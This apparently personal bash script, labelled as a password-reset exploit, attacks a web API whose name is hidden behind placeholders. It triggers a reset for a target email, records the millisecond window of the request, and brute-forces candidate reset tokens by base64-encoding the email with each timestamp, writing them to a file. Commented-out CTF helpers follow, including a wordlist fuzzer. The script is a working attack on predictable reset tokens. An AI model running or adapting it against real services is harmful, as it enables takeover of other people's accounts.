#!/bin/bash

#exploit reset password

#get current timestamp
timestamp(){
	echo "$(($(date +%s%N)/1000000))";
	# echo $time;
}

#reset password based on user email
resetPassword(){
	curl -s -k -X $'POST' \
	 -H $'Accept-Encoding: indentiry' -H $'Content-Type: application/json' \
	 --data-binary $'someemail@here.hide' \
	 $'https://realwebsite.hide/api/account/reset-password' --output -
}

# #calcul scal bettwen to timestamps
calcul(){
	start=$($1) #$1 = timestamp function
	resetPassword > "post.result"
	end=$($1)
	let "bettwen = end - start"
	echo "$start;$bettwen;$end"
}

# #generate tokens based on calculated time

generateTokens(){
	start=$1
	bettwen=$2
	end=$3
	i=0;
	#$4 ---> email
	while [[ ($i -lt $bettwen) || ($start -lt $end) ]]; do
		let "start = start + 1"
		let "i = i + 1"
		# echo $start  && ($start < $end)
		token=$(echo -n "$4$start" | base64)
		echo $token
	done
}

main(){
	#data preperation
	data=$(calcul timestamp)
	start=$(cut -d";" -f1 <<< $data)
	bettwen=$(cut -d";" -f2 <<< $data)
	end=$(cut -d";" -f3 <<< $data) 

	generateTokens "$start" "$bettwen" "$end" "someemail@here.hide"
}

main | tee "token.txt"



#fuzzer HTB
# for word in $(cat $1); do
# 	echo "$word/$1" >> "ctf.txt"
# 	echo "$1/$word" >> "ctf.txt"
# done


#magic HTB

# for i in $(cat $1); do
# 	echo -e "\x$i"
# done



#bandit24
# for i in * .*;
# do
#     if [ "$i" != "." -a "$i" != ".." ];
#     then
#         echo "$i" >> "files.txt"
#         timeout -s 9 60 ./$i
#         rm -f ./$i
#     fi
# done